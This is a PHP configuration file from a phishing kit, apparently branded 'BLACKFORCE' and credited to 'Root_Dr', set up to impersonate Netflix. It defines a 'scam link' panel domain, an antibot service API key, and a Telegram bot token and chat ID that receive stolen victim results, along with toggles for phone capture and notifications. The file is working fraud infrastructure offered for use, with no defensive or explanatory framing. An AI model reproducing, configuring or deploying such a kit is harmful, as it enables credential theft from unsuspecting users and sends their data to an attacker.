﻿<?php
/*
██████╗ ██╗      █████╗  ██████╗██╗  ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██║     ███████║██║     █████╔╝ █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝   
Coded By Root_Dr
DM:@Root_Dr
*/
session_start();
error_reporting(0);

define("TESTMODE", false); // true or false
define("ANTIBOTPW_API", 'd13ec10f0daa87e7bed221e54c944c71'); // ANTIBOT.PW API

define("FLAG", '🎞️');
define("SCAM_NAME", 'NETFLIX');
define("WEBSITE", 'https://netflix.com/');

// SCAM LINK
define("PANEL", 'https://mon-compte-en-ligne.online/');
// TELEGRAM BOT REZ CONFIG
define("TOKEN", '6963096781:AAEsAX0t0gOIxv7CtUAkzG2EqG6eN3_8z88');
define("CHATID", '-4027971949');
// MAIL REZ CONFIG
define("BULLET", '');

define("PHONE", true); // true or false
define("CONTROLLER", true); // true or false
define("NOTIF", true); // true or false